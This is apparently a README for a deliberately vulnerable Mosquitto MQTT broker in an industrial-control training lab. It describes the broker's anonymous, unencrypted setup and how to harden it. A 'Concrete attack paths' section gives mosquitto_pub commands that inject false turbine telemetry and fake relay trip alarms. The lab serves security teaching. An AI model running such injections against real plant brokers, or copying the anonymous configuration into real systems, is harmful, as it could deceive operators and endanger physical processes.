# MQTT broker

`uupl-mqtt` is the MQTT broker for the UU P&L control zone. The turbine PLC
publishes telemetry to it every five seconds. The relay IEDs publish trip events
to it on fault. `allow_anonymous true` means any host on `ics_control` can
publish or subscribe to any topic without credentials.

Nobody configured authentication because "it's on the internal control network."

## How this fits in real OT

MQTT brokers with anonymous access are common in OT environments, particularly
in deployments that adopted MQTT before IIoT security standards matured. The
broker acts as the central message bus for real-time plant telemetry, and
unauthenticated access means any host on the network can both observe all
telemetry and inject arbitrary messages to any topic.

## Container details

Base image: `eclipse-mosquitto:2.0`. No modification beyond configuration.

Exposed ports:
- 1883/tcp: MQTT (no TLS, no authentication)

Configured topics (published by other containers, not enforced by the broker):
- `uupl/turbine/telemetry`: RPM, temperature, pressure, voltage, current,
  frequency, power, emergency stop status (published every 5 s by turbine PLC)
- `uupl/relay/a/trip`: trip events from relay IED A
- `uupl/relay/b/trip`: trip events from relay IED B

Persistence is disabled (`persistence false`). Messages are not retained on
restart.

## Connections

- `ics_control`: 10.10.3.60
- Published to by turbine PLC (10.10.3.21) and relay IEDs (10.10.3.31 / 10.10.3.32)
- Subscribable from any host on `ics_control`

## Protocols

MQTT 3.1.1: port 1883. No TLS. No authentication.

## Built-in vulnerabilities

Anonymous access: `allow_anonymous true` means any client can connect, subscribe
to any topic, and publish to any topic without credentials. There is no topic-level
access control.

Message injection: any host with a route to port 1883 can publish to
`uupl/turbine/telemetry` and replace the real turbine readings with arbitrary
values. A subscriber (such as the SCADA dashboard, if connected) would receive
the injected values as plant data.

Unauthenticated subscription: subscribing to `uupl/#` gives a complete real-time
view of turbine state and relay events without any credentials.

No TLS: MQTT traffic is plaintext. Any host on `ics_control` can read the
message stream with tcpdump or wireshark.

## Modifying vulnerabilities

To require authentication: add a password file to the image and set
`password_file /mosquitto/config/passwd` and `allow_anonymous false` in
`mosquitto.conf`. Create the password file with `mosquitto_passwd`.

To add TLS: mount a certificate and key, add `cafile`, `certfile`, `keyfile`
directives, and change the listener to port 8883.

To add topic-level access control: add an ACL file with `acl_file` in the
config and define per-user topic permissions.

## Hardening suggestions

Enable authentication and disable anonymous access. Add TLS to prevent plaintext
message interception. Define an ACL that restricts each publisher to its own
topic and limits subscriptions to legitimate consumers.

## Observability and debugging

```bash
docker logs mosquitto-broker
mosquitto_sub -h 10.10.3.60 -t '#' -v          # subscribe to all topics
mosquitto_sub -h 10.10.3.60 -t 'uupl/turbine/telemetry'
mosquitto_sub -h 10.10.3.60 -t 'uupl/relay/+/trip'
```

## Concrete attack paths

From any host on `ics_control` (or from the operational zone via the engineering
workstation's control NIC):

Subscribe to all telemetry:
```bash
mosquitto_sub -h 10.10.3.60 -t 'uupl/#' -v
```

Inject false turbine telemetry:
```bash
mosquitto_pub -h 10.10.3.60 -t 'uupl/turbine/telemetry' \
  -m '{"rpm":3000,"temp_c":420,"estop":0,"voltage_a":230,"voltage_b":230}'
```

Inject a fake relay trip event to create a false alarm:
```bash
mosquitto_pub -h 10.10.3.60 -t 'uupl/relay/a/trip' \
  -m '{"relay_id":"a","cause":"overcurrent","voltage":0,"current":250,"rpm":3000}'
```

## Caveats

The broker does not persist messages. A client that subscribes after a message
was published will not see the missed message; it needs to wait for the next publish
cycle (5 seconds for turbine telemetry, event-driven for relay trips).

Injected messages on `uupl/turbine/telemetry` compete with the real PLC
publisher. The PLC publishes every 5 seconds; an attacker injecting at higher
frequency will dominate the topic from a subscriber's perspective, but the PLC
continues publishing the real values regardless.

The Neuron gateway in the DMZ (10.10.5.11) also bridges MQTT. If it has a
subscription configured, messages injected here may propagate into the DMZ
broker as well.

## Summary

Mosquitto MQTT broker, `allow_anonymous true`. Any host on `ics_control` can
subscribe to real-time turbine telemetry and relay trip events, and publish
arbitrary messages to any topic. No TLS, no authentication, no ACL.
